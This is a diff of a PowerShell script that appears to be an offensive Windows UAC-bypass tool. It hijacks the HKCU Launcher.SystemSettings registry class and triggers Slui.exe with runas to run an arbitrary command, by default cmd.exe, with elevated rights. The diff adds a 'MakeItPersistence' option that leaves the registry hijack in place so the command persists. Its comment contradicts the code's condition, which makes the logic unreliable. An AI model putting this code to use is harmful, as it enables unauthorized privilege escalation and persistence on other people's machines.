@@ -50,6 +50,7 @@
 
 $Command = $Null
 $EOP_Success = $False
+$MakeItPersistence = "False"
 $param1 = $args[0] # User Inputs [<arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
@@ -97,10 +98,15 @@ If($CheckVuln -eq $True){
    Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
-   ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
-   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
-   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
+   ## If $MakeItPersistence = "False" then the EOP registry hacks will NOT
+   # be deleted in the end of script execution, making the 'command' persistence.
+   If($MakeItPersistence -eq "False"){
+      ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
+      If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Deleting  EOP registry hacks (revert)"}
+      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
+      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
+      Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
+   }
 
    <#
    .SYNOPSIS
